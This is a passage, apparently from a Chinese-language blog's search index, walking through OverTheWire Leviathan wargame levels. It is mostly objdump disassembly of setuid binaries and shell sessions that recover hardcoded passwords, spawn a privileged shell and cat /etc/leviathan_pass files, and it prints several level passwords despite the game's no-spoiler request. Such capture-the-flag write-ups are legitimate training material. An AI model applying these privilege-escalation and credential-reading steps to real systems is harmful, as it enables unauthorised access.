1c c0 04 08 jmp *0x804c01c 8049086: 68 20 00 00 00 push $0x20 804908b: e9 a0 ff ff ff jmp 8049030 <_init+0x30> 08049090 <exit@plt>: 8049090: ff 25 20 c0 04 08 jmp *0x804c020 8049096: 68 28 00 00 00 push $0x28 804909b: e9 90 ff ff ff jmp 8049030 <_init+0x30> 080490a0 <setreuid@plt>: 80490a0: ff 25 24 c0 04 08 jmp *0x804c024 80490a6: 68 30 00 00 00 push $0x30 80490ab: e9 80 ff ff ff jmp 8049030 <_init+0x30> 080490b0 <atoi@plt>: 80490b0: ff 25 28 c0 04 08 jmp *0x804c028 80490b6: 68 38 00 00 00 push $0x38 80490bb: e9 70 ff ff ff jmp 8049030 <_init+0x30> Disassembly of section .text: 080490c0 <_start>: 80490c0: f3 0f 1e fb endbr32 80490c4: 31 ed xor %ebp,%ebp 80490c6: 5e pop %esi 80490c7: 89 e1 mov %esp,%ecx 80490c9: 83 e4 f0 and $0xfffffff0,%esp 80490cc: 50 push %eax 80490cd: 54 push %esp 80490ce: 52 push %edx 80490cf: e8 19 00 00 00 call 80490ed <_start+0x2d> 80490d4: 81 c3 2c 2f 00 00 add $0x2f2c,%ebx 80490da: 6a 00 push $0x0 80490dc: 6a 00 push $0x0 80490de: 51 push %ecx 80490df: 56 push %esi 80490e0: c7 c0 d6 91 04 08 mov $0x80491d6,%eax 80490e6: 50 push %eax 80490e7: e8 54 ff ff ff call 8049040 <__libc_start_main@plt> 80490ec: f4 hlt 80490ed: 8b 1c 24 mov (%esp),%ebx 80490f0: c3 ret 80490f1: 66 90 xchg %ax,%ax 80490f3: 66 90 xchg %ax,%ax 80490f5: 66 90 xchg %ax,%ax 80490f7: 66 90 xchg %ax,%ax 80490f9: 66 90 xchg %ax,%ax 80490fb: 66 90 xchg %ax,%ax 80490fd: 66 90 xchg %ax,%ax 80490ff: 90 nop 08049100 <_dl_relocate_static_pie>: 8049100: f3 0f 1e fb endbr32 8049104: c3 ret 8049105: 66 90 xchg %ax,%ax 8049107: 66 90 xchg %ax,%ax 8049109: 66 90 xchg %ax,%ax 804910b: 66 90 xchg %ax,%ax 804910d: 66 90 xchg %ax,%ax 804910f: 90 nop 08049110 <__x86.get_pc_thunk.bx>: 8049110: 8b 1c 24 mov (%esp),%ebx 8049113: c3 ret 8049114: 66 90 xchg %ax,%ax 8049116: 66 90 xchg %ax,%ax 8049118: 66 90 xchg %ax,%ax 804911a: 66 90 xchg %ax,%ax 804911c: 66 90 xchg %ax,%ax 804911e: 66 90 xchg %ax,%ax 08049120 <deregister_tm_clones>: 8049120: b8 34 c0 04 08 mov $0x804c034,%eax 8049125: 3d 34 c0 04 08 cmp $0x804c034,%eax 804912a: 74 24 je 8049150 <deregister_tm_clones+0x30> 804912c: b8 00 00 00 00 mov $0x0,%eax 8049131: 85 c0 test %eax,%eax 8049133: 74 1b je 8049150 <deregister_tm_clones+0x30> 8049135: 55 push %ebp 8049136: 89 e5 mov %esp,%ebp 8049138: 83 ec 14 sub $0x14,%esp 804913b: 68 34 c0 04 08 push $0x804c034 8049140: ff d0 call *%eax 8049142: 83 c4 10 add $0x10,%esp 8049145: c9 leave 8049146: c3 ret 8049147: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804914e: 66 90 xchg %ax,%ax 8049150: c3 ret 8049151: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 8049158: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804915f: 90 nop 08049160 <register_tm_clones>: 8049160: b8 34 c0 04 08 mov $0x804c034,%eax 8049165: 2d 34 c0 04 08 sub $0x804c034,%eax 804916a: 89 c2 mov %eax,%edx 804916c: c1 e8 1f shr $0x1f,%eax 804916f: c1 fa 02 sar $0x2,%edx 8049172: 01 d0 add %edx,%eax 8049174: d1 f8 sar %eax 8049176: 74 20 je 8049198 <register_tm_clones+0x38> 8049178: ba 00 00 00 00 mov $0x0,%edx 804917d: 85 d2 test %edx,%edx 804917f: 74 17 je 8049198 <register_tm_clones+0x38> 8049181: 55 push %ebp 8049182: 89 e5 mov %esp,%ebp 8049184: 83 ec 10 sub $0x10,%esp 8049187: 50 push %eax 8049188: 68 34 c0 04 08 push $0x804c034 804918d: ff d2 call *%edx 804918f: 83 c4 10 add $0x10,%esp 8049192: c9 leave 8049193: c3 ret 8049194: 8d 74 26 00 lea 0x0(%esi,%eiz,1),%esi 8049198: c3 ret 8049199: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491a0 <__do_global_dtors_aux>: 80491a0: f3 0f 1e fb endbr32 80491a4: 80 3d 34 c0 04 08 00 cmpb $0x0,0x804c034 80491ab: 75 1b jne 80491c8 <__do_global_dtors_aux+0x28> 80491ad: 55 push %ebp 80491ae: 89 e5 mov %esp,%ebp 80491b0: 83 ec 08 sub $0x8,%esp 80491b3: e8 68 ff ff ff call 8049120 <deregister_tm_clones> 80491b8: c6 05 34 c0 04 08 01 movb $0x1,0x804c034 80491bf: c9 leave 80491c0: c3 ret 80491c1: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 80491c8: c3 ret 80491c9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491d0 <frame_dummy>: 80491d0: f3 0f 1e fb endbr32 80491d4: eb 8a jmp 8049160 <register_tm_clones> 080491d6 <main>: 80491d6: 8d 4c 24 04 lea 0x4(%esp),%ecx 80491da: 83 e4 f0 and $0xfffffff0,%esp 80491dd: ff 71 fc push -0x4(%ecx) 80491e0: 55 push %ebp 80491e1: 89 e5 mov %esp,%ebp 80491e3: 53 push %ebx 80491e4: 51 push %ecx 80491e5: 83 ec 10 sub $0x10,%esp 80491e8: 89 c8 mov %ecx,%eax 80491ea: c7 45 f4 d3 1b 00 00 movl $0x1bd3,-0xc(%ebp) 80491f1: 83 38 02 cmpl $0x2,(%eax) 80491f4: 74 20 je 8049216 <main+0x40> 80491f6: 8b 40 04 mov 0x4(%eax),%eax 80491f9: 8b 00 mov (%eax),%eax 80491fb: 83 ec 08 sub $0x8,%esp 80491fe: 50 push %eax 80491ff: 68 08 a0 04 08 push $0x804a008 8049204: e8 47 fe ff ff call 8049050 <printf@plt> 8049209: 83 c4 10 add $0x10,%esp 804920c: 83 ec 0c sub $0xc,%esp 804920f: 6a ff push $0xffffffff 8049211: e8 7a fe ff ff call 8049090 <exit@plt> 8049216: 8b 40 04 mov 0x4(%eax),%eax 8049219: 83 c0 04 add $0x4,%eax 804921c: 8b 00 mov (%eax),%eax 804921e: 83 ec 0c sub $0xc,%esp 8049221: 50 push %eax 8049222: e8 89 fe ff ff call 80490b0 <atoi@plt> 8049227: 83 c4 10 add $0x10,%esp 804922a: 39 45 f4 cmp %eax,-0xc(%ebp) 804922d: 75 2b jne 804925a <main+0x84> 804922f: e8 2c fe ff ff call 8049060 <geteuid@plt> 8049234: 89 c3 mov %eax,%ebx 8049236: e8 25 fe ff ff call 8049060 <geteuid@plt> 804923b: 83 ec 08 sub $0x8,%esp 804923e: 53 push %ebx 804923f: 50 push %eax 8049240: e8 5b fe ff ff call 80490a0 <setreuid@plt> 8049245: 83 c4 10 add $0x10,%esp 8049248: 83 ec 0c sub $0xc,%esp 804924b: 68 22 a0 04 08 push $0x804a022 8049250: e8 2b fe ff ff call 8049080 <system@plt> 8049255: 83 c4 10 add $0x10,%esp 8049258: eb 10 jmp 804926a <main+0x94> 804925a: 83 ec 0c sub $0xc,%esp 804925d: 68 2a a0 04 08 push $0x804a02a 8049262: e8 09 fe ff ff call 8049070 <puts@plt> 8049267: 83 c4 10 add $0x10,%esp 804926a: b8 00 00 00 00 mov $0x0,%eax 804926f: 8d 65 f8 lea -0x8(%ebp),%esp 8049272: 59 pop %ecx 8049273: 5b pop %ebx 8049274: 5d pop %ebp 8049275: 8d 61 fc lea -0x4(%ecx),%esp 8049278: c3 ret Disassembly of section .fini: 0804927c <_fini>: 804927c: f3 0f 1e fb endbr32 8049280: 53 push %ebx 8049281: 83 ec 08 sub $0x8,%esp 8049284: e8 87 fe ff ff call 8049110 <__x86.get_pc_thunk.bx> 8049289: 81 c3 77 2d 00 00 add $0x2d77,%ebx 804928f: 83 c4 08 add $0x8,%esp 8049292: 5b pop %ebx 8049293: c3 ret \u8fd8\u662fmovl\u8fd9\u4e00\u53e5\u627e\u7acb\u5373\u6570 80491ea: c7 45 f4 d3 1b 00 00 movl $0x1bd3,-0xc(%ebp) 0x1bd3\u6362\u7b97\u4e00\u4e0b\u662f7123 \u7136\u540e\u5f97\u5230\u5bc6\u7801 leviathan6@gibson:~$ ./leviathan6 7123 $ cat /etc/leviathan_pass/leviathan7 8GpZ5f8Hze $ \u8fdb\u5f69\u86cb leviathan7@gibson:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -r--r----- 1 leviathan7 leviathan7 178 Apr 23 18:05 CONGRATULATIONS -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan7@gibson:~$ cat CONGRATULATIONS Well Done, you seem to have used a *nix system before, now try something more serious. (Please don't post writeups, solutions or spoilers about the games on the web. Thank you!) leviathan7@gibson:~$ \u8fd9\u73a9\u610f\u513f\uff0c\u91cc\u9762\u6709\u5927\u91cf\u7684\u4e1c\u897f\u53ef\u4e0d\u662flinux\u64cd\u4f5c\u554a\uff0c\u8fd9\u91cc\u9762\u6709\u9605\u8bfb\u6c47\u7f16\u7684\u5185\u5bb9\u7684\u4e8b\u513f\uff0c\u53ef\u5e95\u5c42\u3002\u3002\u3002 \u88ab\u9a97\u7684\u5f88\u60e8\u554a\uff0c\u8fd9\u91cc\u9762\u8981\u4f1a\u7684linux\u662f\u4e0d\u662f\u6307RHCA\u90a3\u79cd\uff0c\u90a3\u53ef\u771f\u5c4c \u548b\u56de\u4e8b\u513f\uff0c\u4eba\u5bb6\u4e0d\u8ba9\u4f20\u7b54\u6848\uff0caz\uff0c\u53cd\u6b63\u6211\u6ca1\u5565\u6d41\u91cf\uff0c\u5c31\u4f20\u4e86\u5427\u3002\u3002\u3002","title":"leviathan"},{"location":"en/WarGame/leviathan/#level0","text":"ssh\u767b\u5f55\uff0c\u8001\u4e09\u6837\u4e86 \u250c\u2500\ud83c\udf35[myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[11:00:33]$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223 The authenticity of host '[leviathan.labs.overthewire.org]:2223 ([16.16.148.221]:2223)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:6: [hashed name] ~/.ssh/known_hosts:9: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '[leviathan.labs.overthewire.org]:2223' (ED25519) to the list of known hosts. _ _ _ _ | | _____ _(_) __ _| |_| |__ __ _ _ __ | |/ _ \\ \\ / / |/ _` | __| '_ \\ / _` | '_ \\ | | __/\\ V /| | (_| | |_| | | | (_| | | | | |_|\\___| \\_/ |_|\\__,_|\\__|_| |_|\\__,_|_| |_| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames leviathan0@leviathan.labs.overthewire.org's password: ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! leviathan0@gibson:~$","title":"level0"},{"location":"en/WarGame/leviathan/#level1","text":"\u5148\u770b\u4e00\u773c\u5b58\u5bc6\u7801\u7684\u5730\u65b9 total 48 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 111 root root 12288 Apr 23 18:06 ../ -r-------- 1 leviathan0 leviathan0 11 Apr 23 18:04 leviathan0 -r-------- 1 leviathan1 leviathan1 11 Apr 23 18:04 leviathan1 -r-------- 1 leviathan2 leviathan2 11 Apr 23 18:04 leviathan2 -r-------- 1 leviathan3 leviathan3 11 Apr 23 18:04 leviathan3 -r-------- 1 leviathan4 leviathan4 11 Apr 23 18:04 leviathan4 -r-------- 1 leviathan5 leviathan5 11 Apr 23 18:04 leviathan5 -r-------- 1 leviathan6 leviathan6 11 Apr 23 18:04 leviathan6 -r-------- 1 leviathan7 leviathan7 11 Apr 23 18:04 leviathan7 leviathan0@gibson:~$ \u8fd9\u6311\u6218\u5565\u4e5f\u4e0d\u5199\uff0c\u5168\u9760\u8111\u6d1e\u554a\u3002\u3002\u3002 leviathan0@gibson:~$ ll total 24 drwxr-xr-x 3 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ drwxr-x--- 2 leviathan1 leviathan0 4096 Apr 23 18:04 .backup/ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan0@gibson:~$ ll .backup total 140 drwxr-x--- 2 leviathan1 leviathan0 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 leviathan1 leviathan0 133259 Apr 23 18:04 bookmarks.html leviathan0@gibson:~$ cat .backup/bookmarks.html | grep \"pass\" <DT><A HREF=\"http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA\" ADD_DATE=\"1155384634\" LAST_CHARSET=\"ISO-8859-1\" ID=\"rdf:#$2wIU71\">password to leviathan1</A> leviathan0@gibson:~$ \u53cd\u6b63\u8fdb\u53bb\u4ee5\u540e\u770b\u4e86\u770bhome\uff0c\u627e\u5230\u4e86","title":"level1"},{"location":"en/WarGame/leviathan/#level2","text":"\u5148\u770b\u4e00\u4e0b\u6587\u4ef6 leviathan1@gibson:~$ file check check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805, for GNU/Linux 3.2.0, not stripped \u8bf4\u660e\u5982\u4e0b\uff1a - setuid \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u88ab\u8bbe\u7f6e\u4e86 SetUID \u5c5e\u6027\uff0c\u5373\u5728\u6267\u884c\u8be5\u6587\u4ef6\u65f6\uff0c\u4f1a\u4f7f\u7528\u8be5\u6587\u4ef6\u7684\u6240\u6709\u8005\u7684\u6743\u9650\u6765\u6267\u884c\uff0c\u800c\u4e0d\u662f\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u3002 - ELF \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 ELF \u6587\u4ef6\u683c\u5f0f\u3002 - 32-bit \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f 32 \u4f4d\u7684\u3002 - LSB \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u9075\u5faa LSB\uff08Linux Standard Base\uff09\u89c4\u8303\u3002 - Intel 80386 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e3a Intel 80386 \u67b6\u6784\u7f16\u8bd1\u7684\u3002 - version 1 (SYSV) \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 SYSV \u7248\u672c 1 ABI \u6807\u51c6\u3002 - dynamically linked \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u5e93\u3002 - interpreter /lib/ld-linux.so.2 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 /lib/ld-linux.so.2 \u4f5c\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u89e3\u91ca\u5668\u3002 - BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6784\u5efa ID\u3002 - for GNU/Linux 3.2.0 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e3a GNU/Linux 3.2.0 \u7248\u672c\u7f16\u8bd1\u7684\u3002 - not stripped \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u6ca1\u6709\u88ab\u5265\u79bb\uff08stripped\uff09\uff0c\u5373\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5305\u542b\u4e86\u7b26\u53f7\u8868\u548c\u8c03\u8bd5\u4fe1\u606f\uff0c\u4fbf\u4e8e\u8c03\u8bd5\u548c\u5206\u6790\u3002 \u4e00\u5f00\u59cb\u6ca1\u601d\u8def\uff0c\u8f93\u4e86\u597d\u51e0\u904d\u5bc6\u7801\u90fd\u9519\uff0c\u7136\u540e\u7528strings\u626b\u4e86\u4e00\u4e0b leviathan1@gibson:~$ strings check td8 /lib/ld-linux.so.2 _IO_stdin_used __libc_start_main __stack_chk_fail puts printf getchar system strcmp geteuid setreuid libc.so.6 GLIBC_2.4 GLIBC_2.34 GLIBC_2.0 __gmon_start__ secrf love password: /bin/sh Wrong password, Good Bye ... \u641e\u4e86\u4e00\u4e0b\u5b83\u7684\u6c47\u7f16 leviathan1@gibson:~$ objdump -d check check: file format elf32-i386 Disassembly of section .init: 08049000 <_init>: 8049000: f3 0f 1e fb endbr32 8049004: 53 push %ebx 8049005: 83 ec 08 sub $0x8,%esp 8049008: e8 13 01 00 00 call 8049120 <__x86.get_pc_thunk.bx> 804900d: 81 c3 f3 2f 00 00 add $0x2ff3,%ebx 8049013: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 8049019: 85 c0 test %eax,%eax 804901b: 74 02 je 804901f <_init+0x1f> 804901d: ff d0 call *%eax 804901f: 83 c4 08 add $0x8,%esp 8049022: 5b pop %ebx 8049023: c3 ret Disassembly of section .plt: 08049030 <strcmp@plt-0x10>: 8049030: ff 35 04 c0 04 08 push 0x804c004 8049036: ff 25 08 c0 04 08 jmp *0x804c008 804903c: 00 00 add %al,(%eax) ... 08049040 <strcmp@plt>: 8049040: ff 25 0c c0 04 08 jmp *0x804c00c 8049046: 68 00 00 00 00 push $0x0 804904b: e9 e0 ff ff ff jmp 8049030 <_init+0x30> 08049050 <__libc_start_main@plt>: 8049050: ff 25 10 c0 04 08 jmp *0x804c010 8049056: 68 08 00 00 00 push $0x8 804905b: e9 d0 ff ff ff jmp 8049030 <_init+0x30> 08049060 <printf@plt>: 8049060: ff 25 14 c0 04 08 jmp *0x804c014 8049066: 68 10 00 00 00 push $0x10 804906b: e9 c0 ff ff ff jmp 8049030 <_init+0x30> 08049070 <getchar@plt>: 8049070: ff 25 18 c0 04 08 jmp *0x804c018 8049076: 68 18 00 00 00 push $0x18 804907b: e9 b0 ff ff ff jmp 8049030 <_init+0x30> 08049080 <__stack_chk_fail@plt>: 8049080: ff 25 1c c0 04 08 jmp *0x804c01c 8049086: 68 20 00 00 00 push $0x20 804908b: e9 a0 ff ff ff jmp 8049030 <_init+0x30> 08049090 <geteuid@plt>: 8049090: ff 25 20 c0 04 08 jmp *0x804c020 8049096: 68 28 00 00 00 push $0x28 804909b: e9 90 ff ff ff jmp 8049030 <_init+0x30> 080490a0 <puts@plt>: 80490a0: ff 25 24 c0 04 08 jmp *0x804c024 80490a6: 68 30 00 00 00 push $0x30 80490ab: e9 80 ff ff ff jmp 8049030 <_init+0x30> 080490b0 <system@plt>: 80490b0: ff 25 28 c0 04 08 jmp *0x804c028 80490b6: 68 38 00 00 00 push $0x38 80490bb: e9 70 ff ff ff jmp 8049030 <_init+0x30> 080490c0 <setreuid@plt>: 80490c0: ff 25 2c c0 04 08 jmp *0x804c02c 80490c6: 68 40 00 00 00 push $0x40 80490cb: e9 60 ff ff ff jmp 8049030 <_init+0x30> Disassembly of section .text: 080490d0 <_start>: 80490d0: f3 0f 1e fb endbr32 80490d4: 31 ed xor %ebp,%ebp 80490d6: 5e pop %esi 80490d7: 89 e1 mov %esp,%ecx 80490d9: 83 e4 f0 and $0xfffffff0,%esp 80490dc: 50 push %eax 80490dd: 54 push %esp 80490de: 52 push %edx 80490df: e8 19 00 00 00 call 80490fd <_start+0x2d> 80490e4: 81 c3 1c 2f 00 00 add $0x2f1c,%ebx 80490ea: 6a 00 push $0x0 80490ec: 6a 00 push $0x0 80490ee: 51 push %ecx 80490ef: 56 push %esi 80490f0: c7 c0 e6 91 04 08 mov $0x80491e6,%eax 80490f6: 50 push %eax 80490f7: e8 54 ff ff ff call 8049050 <__libc_start_main@plt> 80490fc: f4 hlt 80490fd: 8b 1c 24 mov (%esp),%ebx 8049100: c3 ret 8049101: 66 90 xchg %ax,%ax 8049103: 66 90 xchg %ax,%ax 8049105: 66 90 xchg %ax,%ax 8049107: 66 90 xchg %ax,%ax 8049109: 66 90 xchg %ax,%ax 804910b: 66 90 xchg %ax,%ax 804910d: 66 90 xchg %ax,%ax 804910f: 90 nop 08049110 <_dl_relocate_static_pie>: 8049110: f3 0f 1e fb endbr32 8049114: c3 ret 8049115: 66 90 xchg %ax,%ax 8049117: 66 90 xchg %ax,%ax 8049119: 66 90 xchg %ax,%ax 804911b: 66 90 xchg %ax,%ax 804911d: 66 90 xchg %ax,%ax 804911f: 90 nop 08049120 <__x86.get_pc_thunk.bx>: 8049120: 8b 1c 24 mov (%esp),%ebx 8049123: c3 ret 8049124: 66 90 xchg %ax,%ax 8049126: 66 90 xchg %ax,%ax 8049128: 66 90 xchg %ax,%ax 804912a: 66 90 xchg %ax,%ax 804912c: 66 90 xchg %ax,%ax 804912e: 66 90 xchg %ax,%ax 08049130 <deregister_tm_clones>: 8049130: b8 38 c0 04 08 mov $0x804c038,%eax 8049135: 3d 38 c0 04 08 cmp $0x804c038,%eax 804913a: 74 24 je 8049160 <deregister_tm_clones+0x30> 804913c: b8 00 00 00 00 mov $0x0,%eax 8049141: 85 c0 test %eax,%eax 8049143: 74 1b je 8049160 <deregister_tm_clones+0x30> 8049145: 55 push %ebp 8049146: 89 e5 mov %esp,%ebp 8049148: 83 ec 14 sub $0x14,%esp 804914b: 68 38 c0 04 08 push $0x804c038 8049150: ff d0 call *%eax 8049152: 83 c4 10 add $0x10,%esp 8049155: c9 leave 8049156: c3 ret 8049157: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804915e: 66 90 xchg %ax,%ax 8049160: c3 ret 8049161: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 8049168: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804916f: 90 nop 08049170 <register_tm_clones>: 8049170: b8 38 c0 04 08 mov $0x804c038,%eax 8049175: 2d 38 c0 04 08 sub $0x804c038,%eax 804917a: 89 c2 mov %eax,%edx 804917c: c1 e8 1f shr $0x1f,%eax 804917f: c1 fa 02 sar $0x2,%edx 8049182: 01 d0 add %edx,%eax 8049184: d1 f8 sar %eax 8049186: 74 20 je 80491a8 <register_tm_clones+0x38> 8049188: ba 00 00 00 00 mov $0x0,%edx 804918d: 85 d2 test %edx,%edx 804918f: 74 17 je 80491a8 <register_tm_clones+0x38> 8049191: 55 push %ebp 8049192: 89 e5 mov %esp,%ebp 8049194: 83 ec 10 sub $0x10,%esp 8049197: 50 push %eax 8049198: 68 38 c0 04 08 push $0x804c038 804919d: ff d2 call *%edx 804919f: 83 c4 10 add $0x10,%esp 80491a2: c9 leave 80491a3: c3 ret 80491a4: 8d 74 26 00 lea 0x0(%esi,%eiz,1),%esi 80491a8: c3 ret 80491a9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491b0 <__do_global_dtors_aux>: 80491b0: f3 0f 1e fb endbr32 80491b4: 80 3d 38 c0 04 08 00 cmpb $0x0,0x804c038 80491bb: 75 1b jne 80491d8 <__do_global_dtors_aux+0x28> 80491bd: 55 push %ebp 80491be: 89 e5 mov %esp,%ebp 80491c0: 83 ec 08 sub $0x8,%esp 80491c3: e8 68 ff ff ff call 8049130 <deregister_tm_clones> 80491c8: c6 05 38 c0 04 08 01 movb $0x1,0x804c038 80491cf: c9 leave 80491d0: c3 ret 80491d1: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 80491d8: c3 ret 80491d9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491e0 <frame_dummy>: 80491e0: f3 0f 1e fb endbr32 80491e4: eb 8a jmp 8049170 <register_tm_clones> 080491e6 <main>: 80491e6: 8d 4c 24 04 lea 0x4(%esp),%ecx 80491ea: 83 e4 f0 and $0xfffffff0,%esp 80491ed: ff 71 fc push -0x4(%ecx) 80491f0: 55 push %ebp 80491f1: 89 e5 mov %esp,%ebp 80491f3: 53 push %ebx 80491f4: 51 push %ecx 80491f5: 83 ec 20 sub $0x20,%esp 80491f8: 65 a1 14 00 00 00 mov %gs:0x14,%eax 80491fe: 89 45 f4 mov %eax,-0xc(%ebp) 8049201: 31 c0 xor %eax,%eax 8049203: c7 45 e0 73 65 78 00 movl $0x786573,-0x20(%ebp) 804920a: c7 45 ed 73 65 63 72 movl $0x72636573,-0x13(%ebp) 8049211: 66 c7 45 f1 65 74 movw $0x7465,-0xf(%ebp) 8049217: c6 45 f3 00 movb $0x0,-0xd(%ebp) 804921b: c7 45 e4 67 6f 64 00 movl $0x646f67,-0x1c(%ebp) 8049222: c7 45 e8 6c 6f 76 65 movl $0x65766f6c,-0x18(%ebp) 8049229: c6 45 ec 00 movb $0x0,-0x14(%ebp) 804922d: 83 ec 0c sub $0xc,%esp 8049230: 68 08 a0 04 08 push $0x804a008 8049235: e8 26 fe ff ff call 8049060 <printf@plt> 804923a: 83 c4 10 add $0x10,%esp 804923d: e8 2e fe ff ff call 8049070 <getchar@plt> 8049242: 88 45 dc mov %al,-0x24(%ebp) 8049245: e8 26 fe ff ff call 8049070 <getchar@plt> 804924a: 88 45 dd mov %al,-0x23(%ebp) 804924d: e8 1e fe ff ff call 8049070 <getchar@plt> 8049252: 88 45 de mov %al,-0x22(%ebp) 8049255: c6 45 df 00 movb $0x0,-0x21(%ebp) 8049259: 83 ec 08 sub $0x8,%esp 804925c: 8d 45 e0 lea -0x20(%ebp),%eax 804925f: 50 push %eax 8049260: 8d 45 dc lea -0x24(%ebp),%eax 8049263: 50 push %eax 8049264: e8 d7 fd ff ff call 8049040 <strcmp@plt> 8049269: 83 c4 10 add $0x10,%esp 804926c: 85 c0 test %eax,%eax 804926e: 75 2b jne 804929b <main+0xb5> 8049270: e8 1b fe ff ff call 8049090 <geteuid@plt> 8049275: 89 c3 mov %eax,%ebx 8049277: e8 14 fe ff ff call 8049090 <geteuid@plt> 804927c: 83 ec 08 sub $0x8,%esp 804927f: 53 push %ebx 8049280: 50 push %eax 8049281: e8 3a fe ff ff call 80490c0 <setreuid@plt> 8049286: 83 c4 10 add $0x10,%esp 8049289: 83 ec 0c sub $0xc,%esp 804928c: 68 13 a0 04 08 push $0x804a013 8049291: e8 1a fe ff ff call 80490b0 <system@plt> 8049296: 83 c4 10 add $0x10,%esp 8049299: eb 10 jmp 80492ab <main+0xc5> 804929b: 83 ec 0c sub $0xc,%esp 804929e: 68 1b a0 04 08 push $0x804a01b 80492a3: e8 f8 fd ff ff call 80490a0 <puts@plt> 80492a8: 83 c4 10 add $0x10,%esp 80492ab: b8 00 00 00 00 mov $0x0,%eax 80492b0: 8b 55 f4 mov 